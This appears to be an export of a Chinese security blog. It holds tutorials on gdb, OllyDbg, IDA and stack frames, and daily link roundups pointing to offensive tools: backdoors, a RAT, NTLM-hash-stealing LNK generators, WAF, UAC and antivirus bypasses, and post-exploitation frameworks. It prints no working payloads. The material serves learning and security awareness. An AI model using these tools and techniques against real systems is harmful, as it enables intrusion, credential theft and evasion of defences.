，其中“表达式”可以是任何当前正在被测试程序的有效表达式，比如当前正在调试C语言的程序，那么“表达式”可以是任何C语言的有效表达式，包括数字，变量甚至是函数调用。print a：将显示整数 a 的值print ++a：将把 a 中的值加1,并显示出来print name：将显示字符串 name 的值print gdb_test(22)：将以整数22作为参数调用 gdb_test() 函数print gdb_test(a)：将以变量 a 作为参数调用 gdb_test() 函数bt：显示当前程序的函数调用堆栈。display 表达式：在单步运行时将非常有用，使用display命令设置一个表达式后，它将在每次单步进行指令后，紧接着输出被设置的表达式及值。如： display awatch 表达式：设置一个监视点，一旦被监视的“表达式”的值改变，gdb将强行终止正在被调试的程序。如： watch akill：将强行终止当前正在调试的程序help 命令：help 命令将显示“命令”的常用帮助信息call 函数(参数)：调用“函数”，并传递“参数”，如：call gdb_test(55)layout：用于分割窗口，可以一边查看代码，一边测试：layout src：显示源代码窗口layout asm：显示反汇编窗口layout regs：显示源代码/反汇编和CPU寄存器窗口layout split：显示源代码和反汇编窗口Ctrl + L：刷新窗口quit：简记为 q ，退出gdb当然，gdb的功能远不止这些，包括多进程/多线程/信号/远程调试等功能在这里均没有提及，有需要的读者可以参考其它信息。 代码调试首先我们使用gcc -g命令对代码进行编译 generates debug information to be used by GDB debugger.123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475xxx@ubuntu:~/Desktop/test1$ cat command.c#include &lt;stdio.h&gt;int main(int argc,char *argv[])&#123;int i;for (i=0;i&lt;argc;i++) printf(&quot;argv[%d]:%s \n&quot;,i,argv[i]);return 0;&#125;xxx@ubuntu:~/Desktop/test1$ gcc -g command.c -o commandxxx@ubuntu:~/Desktop/test1$ gdb -q ./commandReading symbols from ./command...done.gdb-peda$ l1 #include &lt;stdio.h&gt;2 int main(int argc,char *argv[])3 &#123;4 int i;5 for (i=0;i&lt;argc;i++)6 printf(&quot;argv[%d]:%s \n&quot;,i,argv[i]);7 return 0;8 &#125;gdb-peda$ b 6Breakpoint 1 at 0x400545: file command.c, line 6.gdb-peda$ run param1 param2 param3Starting program: /home/xxx/Desktop/test1/command param1 param2 param3[----------------------------------registers-----------------------------------]RAX: 0x0 RBX: 0x0 RCX: 0x0 RDX: 0x7fffffffe010 --&gt; 0x7fffffffe390 (&quot;XDG_VTNR=7&quot;)RSI: 0x7fffffffdfe8 --&gt; 0x7fffffffe35b (&quot;/home/xxx/Desktop/test1/command&quot;)RDI: 0x4 RBP: 0x7fffffffdf00 --&gt; 0x0 RSP: 0x7fffffffdee0 --&gt; 0x7fffffffdfe8 --&gt; 0x7fffffffe35b (&quot;/home/xxx/Desktop/test1/command&quot;)RIP: 0x400545 (&lt;main+24&gt;: mov eax,DWORD PTR [rbp-0x4])R8 : 0x7ffff7dd4e80 --&gt; 0x0 R9 : 0x7ffff7dea700 (&lt;_dl_fini&gt;: push rbp)R10: 0x7fffffffdd90 --&gt; 0x0 R11: 0x7ffff7a32e50 (&lt;__libc_start_main&gt;: push r14)R12: 0x400440 (&lt;_start&gt;: xor ebp,ebp)R13: 0x7fffffffdfe0 --&gt; 0x4 R14: 0x0 R15: 0x0EFLAGS: 0x297 (CARRY PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0x400538 &lt;main+11&gt;: mov QWORD PTR [rbp-0x20],rsi 0x40053c &lt;main+15&gt;: mov DWORD PTR [rbp-0x4],0x0 0x400543 &lt;main+22&gt;: jmp 0x400574 &lt;main+71&gt;=&gt; 0x400545 &lt;main+24&gt;: mov eax,DWORD PTR [rbp-0x4] 0x400548 &lt;main+27&gt;: cdqe 0x40054a &lt;main+29&gt;: lea rdx,[rax*8+0x0] 0x400552 &lt;main+37&gt;: mov rax,QWORD PTR [rbp-0x20] 0x400556 &lt;main+41&gt;: add rax,rdx[------------------------------------stack-------------------------------------]0000| 0x7fffffffdee0 --&gt; 0x7fffffffdfe8 --&gt; 0x7fffffffe35b (&quot;/home/xxx/Desktop/test1/command&quot;)0008| 0x7fffffffdee8 --&gt; 0x400400440 0016| 0x7fffffffdef0 --&gt; 0x7fffffffdfe0 --&gt; 0x4 0024| 0x7fffffffdef8 --&gt; 0x0 0032| 0x7fffffffdf00 --&gt; 0x0 0040| 0x7fffffffdf08 --&gt; 0x7ffff7a32f45 (&lt;__libc_start_main+245&gt;: mov edi,eax)0048| 0x7fffffffdf10 --&gt; 0x0 0056| 0x7fffffffdf18 --&gt; 0x7fffffffdfe8 --&gt; 0x7fffffffe35b (&quot;/home/xxx/Desktop/test1/command&quot;)[------------------------------------------------------------------------------]Legend: code, data, rodata, valueBreakpoint 1, main (argc=0x4, argv=0x7fffffffdfe8) at command.c:66 printf(&quot;argv[%d]:%s \n&quot;,i,argv[i]);gdb-peda$ p i$1 = 0x0gdb-peda$ p argv$2 = (char **) 0x7fffffffdfe8gdb-peda$ p argc$3 = 0x4gdb-peda$ Reference linux 调试工具 GDB 使用教程http://bbs.pediy.com/thread-77746.htm]]></content>
  </entry>
  <entry>
    <title><![CDATA[window逆向基础]]></title>
    <url>%2F2017%2F08%2F24%2Fwindow%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[常见汇编指令助记JG / JNLE：Jump when Greater / Jump when Not Less or EqualJL / JNGE：Jump when Less / Jump when Not Greater or EqualJGE / JNL：Jump when Greater or Equal / Jump when Not LessJLE / JNG：Jump when Less or Equal / Jump when Not GreaterJE / JZ：Jump when Less / Jump when Zero 字节序windows操作系统兼容的CPU为小端（内存高位地址存放数据高位字节数据）方式，而UNIX操作系统所兼容的CPU大多为大端（内存高位地址存放数据低位字节数据）方式。此外，还有一个网络字节序，是指网络传输相关协议所规定的字节传输顺序，TCP/IP协议所使用的字节序为大端方式。 Reference API 函数 －－ API 绝密档案系列之一http://bbs.pediy.com/user-22319-1.htm Win32环境下函数调用的堆栈之研究http://bbs.pediy.com/thread-69909.htm 汇编的学习http://bbs.pediy.com/user-90551-1-1.htmhttp://bbs.pediy.com/user-202613-0-1.htm window线程http://bbs.pediy.com/thread-77556.htm C++类虚函数逆向学习总结http://bbs.pediy.com/thread-60538.htm MFC逆向初级研究http://bbs.pediy.com/thread-41087.htm 驱动安全http://blog.csdn.net/zuishikonghuan/]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170824安全动态]]></title>
    <url>%2F2017%2F08%2F24%2F20170824%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 thefuck，就是之前推特上面的那个思路，但是加了自动帮你correct的功能https://github.com/nvbn/thefuck 不是修改数据的攻击就叫数据攻击https://media.weibo.cn/article?id=2309404144223724113779&amp;from=timeline&amp;isappinstalled=1&amp;jumpfrom=weibocom 两个绕waf的xss payloadhttps://twitter.com/i_bo0om/status/900270098392403968 kalirouter:如何将Kali Linux转换为一个路由器（向在另一台机器上运行的拦截代理（如BurpSuite）发送HTTP和HTTPS流量、可以通过wireshark记录所有流量）https://github.com/koenbuyens/kalirouter raven：针对Linkedin信息收集工具 waf openstarhttps://github.com/starjun/openstar 如何使用Shodan命令行获取一个国家最受欢迎的服务列表 ,主要对一些服务的统计 小技巧 使用certutil 传送文件http://carnal0wnage.attackresearch.com/2017/08/certutil-for-delivery-of-files.html 跨平台Macro钓鱼攻击payload&#x68;&#116;&#x74;&#x70;&#x73;&#x3a;&#x2f;&#47;&#x6d;&#101;&#x64;&#105;&#x75;&#109;&#x2e;&#99;&#111;&#x6d;&#x2f;&#x40;&#x6d;&#x61;&#108;&#x63;&#x6f;&#109;&#x76;&#x65;&#116;&#x74;&#x65;&#114;&#47;&#x6d;&#x75;&#108;&#x74;&#x69;&#x2d;&#112;&#x6c;&#97;&#116;&#102;&#111;&#114;&#109;&#45;&#x6d;&#97;&#x63;&#114;&#111;&#x2d;&#x70;&#104;&#105;&#115;&#104;&#105;&#x6e;&#103;&#45;&#x70;&#97;&#x79;&#108;&#x6f;&#97;&#x64;&#115;&#45;&#x33;&#98;&#x36;&#x38;&#56;&#101;&#56;&#101;&#102;&#x66;&#x36;&#x38; canisrufus：隐藏的基于Python的Windows后门，使用Github作为CC服务器https://github.com/maldevel/canisrufus portia：在内网渗透中自动化执行https://github.com/SpiderLabs/portia 1一键日内网？ 如何安全的使用PGP&#104;&#x74;&#x74;&#112;&#115;&#58;&#47;&#47;&#109;&#x65;&#100;&#x69;&#x75;&#x6d;&#x2e;&#x63;&#111;&#x6d;&#47;&#64;&#116;&#104;&#101;&#103;&#114;&#x75;&#103;&#x71;&#47;&#x74;&#x68;&#101;&#45;&#122;&#101;&#x6e;&#45;&#x6f;&#102;&#x2d;&#x70;&#x67;&#112;&#x2d;&#x36;&#102;&#53;&#53;&#100;&#52;&#x34;&#x36;&#x35;&#x37;&#x64;&#100; sRDI：Shellcode反射式DLL注入https://silentbreaksecurity.com/srdi-shellcode-reflective-dll-injection/ 逆向Humble Bundle应用程序以获得API访问 360加固保关键技术浅析http://www.freebuf.com/articles/terminal/145102.html 利用 HTTP 请求的编码绕过 WAF 防御https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/august/request-encoding-to-bypass-web-application-firewalls/ 小技巧：利用轻量级系统监控工具Sysmon监控Minikatz的密码转储http://www.mottoin.com/105035.html关于 sysmon的config文件 可以参考这个 https://github.com/SwiftOnSecurity/sysmon-config Sysmon View：跟踪和可视化Sysmon日志1试了一下，效果还不错]]></content>
  </entry>
  <entry>
    <title><![CDATA[栈帧]]></title>
    <url>%2F2017%2F08%2F23%2F%E6%A0%88%E5%B8%A7%2F</url>
    <content type="text"><![CDATA[前言 主要通过od来跟踪调试一下，理解一下栈的调用情况。环境及代码环境win7 32位+vc6.012345678910111213141516#include &quot;stdio.h&quot;long add(long a, long b)&#123; long x = a, y = b; return (x + y);&#125;int main(int argc, char* argv[])&#123; long a = 1, b = 2; printf(&quot;%d\n&quot;, add(a, b)); return 0;&#125; 过程在这之前，首先找到main函数，并加上一定的注释以及对应的断点。1.首先是进入main函数之前，我们查看一下ebp的值是0012ff88，esp是0012ff50，注意此时下一条指令的地址是00401279，如下图2.这个时候f7进入main函数，这个时候esp变成0012ff4c即减小了4，ebp不变3.然后呢，有一个跳转到push ebp，所以执行这个代码时候，ebp的值会入栈，esp的值加4，变成00112ff484.f8执行 mov ebp,esp命令，这个时候ebp的值发生变化，变成和esp一样的值都是0012ff485.f8执行 sub esp,48 扩展栈空间，esp减小48h个长度，ebp保持不变6.f8 然后就是将ebx，esi，edi等入栈的操作等。。。7.函数的返回要注意清场,栈顶和栈底是一样的都是0012ff488.f8执行pop ebp，这个时候是将栈顶中的值0012ff88放到ebp中，那么ebp的值发生变化成为0012ff88，执行pop操作，esp+4 为0012ff4c9.f8 执行retn指令，esp发生变化+4变为0012ff50，ebp的值为0012ff88，eip指向00401279，即call main函数的下一条指令执行 总结 main函数的过程中，进入之前栈底指针ebp是0012ff88，栈顶指针是0012ff50，结束函数之后，没有发生变化，即栈维持这平衡。]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170823安全动态]]></title>
    <url>%2F2017%2F08%2F23%2F20170823%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 浏览器漏洞挖掘思路https://zhuanlan.zhihu.com/p/28719766 Discuz X3.3补丁安全分析http://bobao.360.cn/learning/detail/4302.html lighttpd域处理拒绝服务漏洞环境从复现到分析http://bobao.360.cn/learning/detail/4301.html Java 8 Jar＆Android APK逆向工程工具（Decompiler，Editor，Debugger＆More）https://github.com/Konloch/bytecode-viewer/ TechWorld2017热点回顾 | 机器学习在安全攻防的实践http://blog.nsfocus.net/machine-learning-techworld2017/其它 开源|基于区块链的智能合约快速上手https://www.v2ex.com/t/385110#reply1 一个可以使用各种图片的网站，图链网。以后可以在markdown里面多添加几张图片就不会那么单调了http://tulian.net/ 多服务器 云探针、云监控 —— ServerStatus 一键管理脚本https://doub.io/shell-jc3/ 逆向微信 Make WeChat Great Againhttp://yulingtianxia.com/blog/2017/02/28/Make-WeChat-Great-Again/ sudo 更改文件的所有者以及所在的组 chown -R root:wheel xxx.app]]></content>
  </entry>
  <entry>
    <title><![CDATA[OllyDbg使用入门]]></title>
    <url>%2F2017%2F08%2F22%2FOllyDbg%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[一些常用的操作 可通过双击汇编窗口注释区或者右键给汇编代码添加注释，方便自己后续阅读，这里有一个小技巧，可以通过ida的静态分析方法进行静态分析加注释小技巧 有时候在调试的时候，一直在循环里，如果想要跳出循环，这个时候鼠标点到下一个命令的执行处，f4即可，即运行到当前代码处 在用vs较高版本编译程序测试溢出等的时候注意要关闭保护功能(如常见的dep以及aslr)，在项目菜单的属性里面设置 在跟踪调试的时候，我们关注的是每步执行过后寄存器的变化情况，这个时候观察寄存器的窗口，红色的表示是发生了变化的数据。 在进行动态分析的时候，最好完整的分析一个栈的出入过程，加上注释之后，对代码分析有好处 刚开始调试的时候，容易跑飞，这个时候注意观察左上角的提示框，回显示你的module，不要进去了什么kernel模块 注意由于基本上我们使用的系统上数据或者代码都是小端存储的，所以在看反汇编代码的时候看到机器码的时候，一定要倒过来看 通过菜单中的查看内存map，整个可执行文件结构在内存中的地址映射此外还有L可以查看log data信息，E查看可执行模块，B查看断点信息。 在vc6编译的程序中，函数返回之前会有一句call _checkesp，这里会有一个checkesp函数的调用，来检查栈是否平衡，如果不平衡会出现如下的错误，我在这里做一个测试，在return语句之前加一条内联汇编push ebx，这样就破坏了栈平衡如下图所示 vc中函数的调用方式是cdecl，这种函数调用约定对参数的传递依靠栈内存，在调用函数前，将通过压栈操作将参数从右至左依次送入栈中，当函数返回的时候，需要将参数使用的空间回收，这里的回收指的是恢复esp寄存器的值到函数调用前的值，对于cdecl调用方式而言，平衡堆栈的操作是由函数调用方来做的，在这里也就是要由main()函数来做的，可以看到反汇编代码add esp，8就是用来平衡栈的。主要用于平衡上面的两个push操作。 函数返回值通常保存在eax寄存器中，在c语言中，main()函数的返回值为0，即return0，因此xor eax,eax 就是对eax进行了清零操作。 windows系统下，对API函数的调用遵循约定是stdcall，对于stdcall而言，参数依然是从右向左依次入栈，而参数的平栈则是在api函数内部完成的，而不是在函数调用时候完成的。上图中可以看到在调用MessageBox()的时候,在retn指令后面加了一个10，10这里是十六进制，也就是十进制中的16，我们在为MessageBoxA传递参数的时候，每个参数是4字节，4*4=16个字节，因此retn 16除了有返回的作用外，还包含了add esp,10的作用。Reference OllyDbg 入门系列http://bbs.pediy.com/user-24467-3-1.htm 拿几个ctf的简单题目练习一下https://github.com/lcatro/SISE_Traning_CTF_RE]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170822安全动态]]></title>
    <url>%2F2017%2F08%2F22%2F20170822%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 [渗透测试]Tunnel Manager - From RCE to Docker Escapehttps://xianzhi.aliyun.com/forum/read/2009.html 开源扫描器https://github.com/We5ter/Scanners-Box/blob/master/README_CN.md Responder Responder is a LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication.https://github.com/SpiderLabs/R .esponder malloc.c源码阅读之__libc_freehttp://0x48.pw/2017/08/07/0x37/ CVE-2016-0095从PoC到Exploithttp://weaponx.site/2017/08/11/CVE-2016-0095%E4%BB%8EPoC%E5%88%B0Exploit/ network_backdoor_scanner 后渗透后门程序,适合在已经攻陷的内网中做下一步的网络信息扫描..https://github.com/lcatro/network_backdoor_scanner PowerShdll - 实现 powershell 功能的 dll 文件，以 rundll32 运行，可绕过 powershell.exe 的运行限制https://github.com/p3nt4/PowerShdll 一道CrackMe题目分析（含样本下载）https://secrary.com/CrackMe/AdvancedKeygenme/其它awesome-sec-talks 国外一些安全的视频https://github.com/PaulSec/awesome-sec-talks]]></content>
  </entry>
  <entry>
    <title><![CDATA[windbg使用]]></title>
    <url>%2F2017%2F08%2F21%2Fwindbg%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[ReferenceWinDbg学习笔记（一）–认识WinDbg从Ollydbg说起—–WinDbg用户态调试教程Windbg基本调试技术Windows 调试器 WinDBG 和 KD 学习系列 PPT(https://www.youtube.com/watch?v=8zBpqc3HkSE&amp;list=PLhx7-txsG6t6n_E2LgDGqgvJtCHPL7UFu)(https://www.youtube.com/user/TheSourceLens)(https://www.youtube.com/user/TheSourceLens)]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170821安全动态]]></title>
    <url>%2F2017%2F08%2F21%2F20170821%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 dns日志记录方法https://green-m.github.io/2017/08/21/windows-dns-log/ 1亲测，可行 vulscan - Nmap 的漏洞探测脚本，根据版本信息判断是否存在漏洞https://github.com/scipag/vulscan 1渗透的童鞋可以试下 TURNING LFI INTO RFIhttps://l.avala.mp/?p=241 绕过极限证https://github.com/FanhuaandLuomu/geetest_break 1攻防技术总是此消彼长的，有新的技术防御技术出现，对应的攻击技术也会出现 udp2raw tunnel:通过raw socket给UDP包加上TCP或ICMP header，进而绕过UDP屏蔽或QoS，或在UDP不稳定的环境下提升稳定性。可以有效防止在使用kcptun或者finalspeed的情况下udp端口被运营商限速。https://github.com/wangyu-/udp2raw-tunnel Honeywell Tuxedo 家用安保系统的逆向分析https://markclayton.github.io/reverse-engineering-my-home-security-system-decompiling-firmware-updates.html sniffMK - macOS 上的鼠标与键盘事件嗅探工具https://github.com/objective-see/sniffMK portia - 基于 Python 实现的自动化后渗透工具，拥有权限提升、横向渗透等功能：https://github.com/SpiderLabs/portia tornado - 一款 MITM 攻击工具https://github.com/rebellionil/tornado 劫持无线鼠标并攻击目标计算机https://www.toshellandback.com/2017/08/16/mousejack/ IDA反汇编/反编译静态分析iOS模拟器程序 系列文章http://blog.csdn.net/column/details/ios-ida.html mac osx 中酷炫的命令行工具https://github.com/herrbischoff/awesome-osx-command-line 两篇绕杀软的文章https://www.linkedin.com/pulse/bypass-all-anti-viruses-encrypted-payloads-c-damon-mohammadbagher?trk=v-feedhttps://www.linkedin.com/pulse/bypass-anti-virus-detection-encrypted-payloads-using-venom-james-ceh?trk=v-feed dockerscan：docker安全分析工具https://github.com/cr0hn/dockerscan 沙盒攻击面分析工具v1.0.9https://github.com/google/sandbox-attacksurface-analysis-tools/releases/tag/v1.0.9 使用代理扫描https://cybersyndicates.com/2015/12/nmap-and-proxychains-scanning-through-a-socks-piviot/]]></content>
  </entry>
  <entry>
    <title><![CDATA[IDA使用方法]]></title>
    <url>%2F2017%2F08%2F18%2FIDA%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[前言IDA作用：1.一般IDA是配合OD使用的，当od没有分析出函数名的时候，有时候通过IDA可以发现函数的名。 常见操作在介绍常见操作之前，先来看一下用ida加载一个文件的时候，默认的展示窗口有哪些注意在反汇编代码的窗口可以输入空格切换到Graphic View，可以更清楚的看清流程 跳转到指定内存地址 快捷键G，可以调到相应的地址 寻找关键特征字符串，打开字符串参考窗口 shift+f12 ，类似于od中plugins中的中文搜索引擎中的智能搜索功能 函数的收缩和展开功能 在vc6中main()不是程序运行的第一个函数，而是程序员编写程序的第一个函数，main()函数是由启动函数来调用的，vc6中入口点是_mainCRTStartup()函数，如下图所示双击即可到达这个函数的位置，1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859.text:00401130 push ebp.text:00401131 mov ebp, esp.text:00401133 push 0FFFFFFFFh.text:00401135 push offset stru_422130.text:0040113A push offset __except_handler3.text:0040113F mov eax, large fs:0.text:00401145 push eax.text:00401146 mov large fs:0, esp.text:0040114D add esp, 0FFFFFFF0h.text:00401150 push ebx.text:00401151 push esi.text:00401152 push edi.text:00401153 mov [ebp+ms_exc.old_esp], esp.text:00401156 call ds:__imp__GetVersion@0 ; GetVersion().text:0040115C mov __osver, eax.text:00401161 mov eax, __osver.text:00401166 shr eax, 8.text:00401169 and eax, 0FFh.text:0040116E mov __winminor, eax.text:00401173 mov ecx, __osver.text:00401179 and ecx, 0FFh.text:0040117F mov __winmajor, ecx.text:00401185 mov edx, __winmajor.text:0040118B shl edx, 8.text:0040118E add edx, __winminor.text:00401194 mov __winver, edx.text:0040119A mov eax, __osver.text:0040119F shr eax, 10h.text:004011A2 and eax, 0FFFFh.text:004011A7 mov __osver, eax.text:004011AC push 0.text:004011AE call __heap_init.text:004011B3 add esp, 4.text:004011B6 test eax, eax.text:004011B8 jnz short loc_4011C4.text:004011BA push 1Ch.text:004011BC call fast_error_exit.text:004011C1 ; ---------------------------------------------------------------------------.text:004011C1 add esp, 4.text:004011C4.text:004011C4 loc_4011C4: ; CODE XREF: _mainCRTStartup+88j.text:004011C4 mov [ebp+ms_exc.registration.TryLevel], 0.text:004011CB call __ioinit.text:004011D0 call ds:__imp__GetCommandLineA@0 ; GetCommandLineA().text:004011D6 mov __acmdln, eax.text:004011DB call ___crtGetEnvironmentStringsA.text:004011E0 mov __aenvptr, eax.text:004011E5 call __setargv.text:004011EA call __setenvp.text:004011EF call __cinit.text:004011F4 mov ecx, __environ.text:004011FA mov ___initenv, ecx.text:00401200 mov edx, __environ.text:00401206 push edx ; envp.text:00401207 mov eax, ___argv.text:0040120C push eax ; argv.text:0040120D mov ecx, ___argc.text:00401213 push ecx ; argc.text:00401214 call _main_0 如上所示，是进入这个函数后的汇编代码，可以看到main函数在00401214位置处，启动函数从00401130地址处开始，期间调用了GetVersion()函数获得了系统版本号，调用__heap_init函数初始化了程序所使用的堆空间，调用了GetCommandLineA()函数获取了命令行参数,调用_crtGetEnvironmentStringsA()获取了环境变量字符串，在完成一系列启动所需的工作之后，终于在00401214处调用了main()函数。 在调用printf时候的指令为call printf,而调用像是MessageBoxA时候的指令是call ds:impMessageBoxA@16 ; MessageBoxA(x,x,x,x)，printf函数在stdio.h头文件中，该函数是c语言的静态库，在链接的时候会将其代码接入到二进制文件中(静态包含)，而MessageBoxA的函数实现是在user32.dll这个动态链接库中，在代码中，这里只是留了进入MessageBoxA函数的一个地址，并没有具体的代码，MessageBoxA的具体地址存放在数据节区中，因此在反汇编代码中给出了提示，使用了前缀”ds”,imp表示导入函数，@16表示16个字节，16/4即函数又4个参数。注意 在od中汇编代码是这样call dword ptr ds:[&lt;&amp;USER32.MessageBoxA&gt;]，感觉没有ida的友好。 switch case default结构的特征 名称与命名在进行样本分析时，ID A识别出来的函数名都是sub_xxxxxx，这种命名方式不适合我们阅读和分析，在我们进行分析后，知道函数或者变量的意义，那么我们可以对其进行重命名。方法是鼠标点击函数名或者变量，然后按下键盘上的N键，在弹出的窗口中写入新的名字即可。ReferenceIDA简易教程]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170818安全动态]]></title>
    <url>%2F2017%2F08%2F18%2F20170818%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 漏洞根源在于人——知识深度篇http://www.freebuf.com/vuls/144705.html safari本地文件读取漏洞之扩展攻击面http://www.wupco.cn/?p=4134 Bypass 360主机卫士SQL注入防御http://www.cnblogs.com/xiaozi/p/7275134.html node-postgres code execution vulnerabilityhttps://node-postgres.com/announcements#2017-08-12-code-execution-vulnerability msdtc后门的实现思路http://www.4hou.com/system/6890.html #164224 Urgent: Server side template injection via Smarty template allows for RCEhttps://hackerone.com/reports/164224 Using get_defined_functions To Hidden A PHP Backdoorhttp://reverse-tcp.xyz/2017/08/17/Using-get_defined_functions-to-hidden-a-php-backdoor/ 内网发现技巧补充https://mp.weixin.qq.com/s/l-Avt72ajCIo5GdMEwVx7A ssh如何方向代理稳定穿透内网http://bobao.360.cn/learning/detail/4234.html ZDI 公开了两个 Foxit Reader 的 0Day，分别是 JavaScript API 触发的命令执行（CVE-2017-10951）和文件写漏洞（CVE-2017-10952），由于触发漏洞需要绕过 Safe Reading Mode，所以官方拒绝修复https://www.zerodayinitiative.com/blog/2017/8/17/busting-myths-in-foxit-reader mod0Umleitung - Windows 上的 DNS 转发服务器，可中途对 DNS 请求进行篡改以及返回自定义的 DNS 解析结果https://modzero.github.io/mod0Umleitung/ 结合 Blind SSRF 漏洞以及 HashiCorp Consul 的错误配置转换成高危的 RCE 漏洞http://www.kernelpicnic.net/2017/05/29/Pivoting-from-blind-SSRF-to-RCE-with-Hashicorp-Consul.html Koadic：COM 命令控制框架（JScript RAT，类似Meterpreter、Empire）http://www.kitploit.com/2017/08/koadic-com-command-control-framework.html 3个步骤实现简单语言解释器（自制简易编程语言）https://francisstokes.wordpress.com/2017/08/16/programming-language-from-scratch/ AndroidManifest.xml文件安全探索 burpsuite插件开发被动式扫描http://www.itwzw.cn/burpsuite-ext-passivescan/其它 如何知道程序的运行时间time xxx ,time python demo.py 一次基于zio编写pwn的exp的尝试http://bestwing.me/2016/10/22/%E5%9F%BA%E4%BA%8Ezio%E7%9A%84exp%E5%88%9D%E6%AC%A1%E5%B0%9D%E8%AF%95/ 反汇编的利器 IDA 和 Hopper 的基本使用https://niyaoyao.github.io/2017/01/18/Learning-Reverse-From-Today-D3/]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170817安全动态]]></title>
    <url>%2F2017%2F08%2F17%2F20170817%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 漏洞发现之细节决定成败http://www.freebuf.com/column/144527.html LNKup - 利用 Windows 快捷方式窃取用户 NTLM Hash 以及环境变量的工具https://github.com/Plazmaz/LNKUp Puppeteer - 基于 DevTools 协议，用于自动化控制 Chrome 浏览器的 Node 库，可用来实现网络爬虫、网页截图、UI 测试等等https://github.com/GoogleChrome/puppeteer graudit - Bash 实现的源代码安全漏洞扫描器，可自定义漏洞的判断规则https://github.com/wireghoul/graudit 在Windows上使用MSFVenom生成PowerShell脚本 浅谈简易端口扫描威胁感知系统的设计与实现http://www.freebuf.com/articles/network/144288.html其它 堆栈溢出攻击原理http://blog.csdn.net/aemperor/article/details/47310593 Shellcode生成器——msfvenomhttp://brieflyx.me/2015/linux-tools/msfvenom-intro/ gdb与peda指令学习学习笔记http://xq.dropsec.xyz/2016/10/30/gdb%E4%B8%8Epeda%E6%8C%87%E4%BB%A4%E5%AD%A6%E4%B9%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/mac下推荐使用Snitch Network Monitor,进行流量的查看以及拦截，最好拦截掉搜狗输入法和Alipay这样的程序，感觉时刻都在上传你的数据]]></content>
  </entry>
  <entry>
    <title><![CDATA[linux栈溢出学习笔记]]></title>
    <url>%2F2017%2F08%2F16%2Flinux%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[gdb使用gdb GNU Project Debugger在linux下面调试程序必然会用到gdb，当然还有gdb的一个插件也是必须，那就是pedapeda增强了gdb的功能，在调试过程中会显示反汇编的代码、寄存器、内存信息等 aslr – 显示和设置GDB的aslr checksec – 显示多种安全机制的开关 dumpargs – 当停到一个call 指令的时候，显示传递给函数的参数 dumpprop – dump所有ROP gadgets 在一定的内存范围内 elfheader – 获取被调试的ELF文件的头信息 lefsymbol –获取非调试状态下的 符号信息 lookup – 在一定地址范围内查找所有的地址以及引用 patch – Patch memory start at an address with string/hexstring/int pattern – Generate, search, or write a cyclic pattern to memory procinfo – 从/proc/pid/显示不同的信息 pshow – 显示peda的选项以及其它的设置 pset – 设置peda的选项以及其它的设置 readelf 获取ELF文件的头部信息 ropgadget – Get common ROP gadgets of binary or library ropsearch – Search for ROP gadgets in memory searchmem|find – Search for a pattern in memory; support regex search shellcode – Generate or download common shellcodes. skeleton – Generate python exploit code template vmmap – Get virtual mapping address ranges of section(s) in debugged process xormem – XOR a memory region with a key 在gdb中，常用的就是如下的命令attach 附加某个进程进行调试run 运行程序 ，会在断点处停下来break或者b xxx ，下断点next 类似于od中的单步步过step 类似于od中的单步步入 ReferenceLinux gdb调试器用法全面解析一步一步学ROP之linux_x86篇linux溢出练习linux Hook笔记手把手教你栈溢出DEF CON CTF Quals 2015: r0pbaby]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170816安全动态]]></title>
    <url>%2F2017%2F08%2F16%2F20170816%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 Babadook — PowerShell 编写的一个无连接弹性后门https://github.com/jseidl/Babadook 利用 SVG Bypass Chrome XSS Auditorhttps://brutelogic.com.br/blog/chrome-xss-auditor-svg-bypass/ iSpy - iOS 逆向分析、动态分析框架，支持 Class Dump、越狱检测 Bypass 等等特性https://n0where.net/ios-reverse-engineering-framework/ 开源恶意软件沙盒分析工具https://n0where.net/open-source-malware-analysis-laboratory/ PytheM - Python 语言写的一款渗透测试框架https://n0where.net/python-pentesting-framework-pythem/ 利用 CMSTP.exe Bypass UAC 以及强迫 Webdav 加载 DLLhttps://msitpros.com/?p=3960 直播windows98漏洞挖掘https://www.youtube.com/watch?v=hLGQYi8W5sw Yahoo漏洞赏金计划：看我如何接管任意Flurry用户帐户http://lightningsecurity.io/blog/password-not-provided/ LNKUp：生成恶意LNK文件payload用于渗出数据https://github.com/Plazmaz/LNKUp ClamAV® is an open source antivirus engine for detecting trojans, viruses, malware &amp; other malicious threats.https://www.clamav.net/https://github.com/Cisco-Talos/clamav-faq 记一次 Linux 下 XordDos 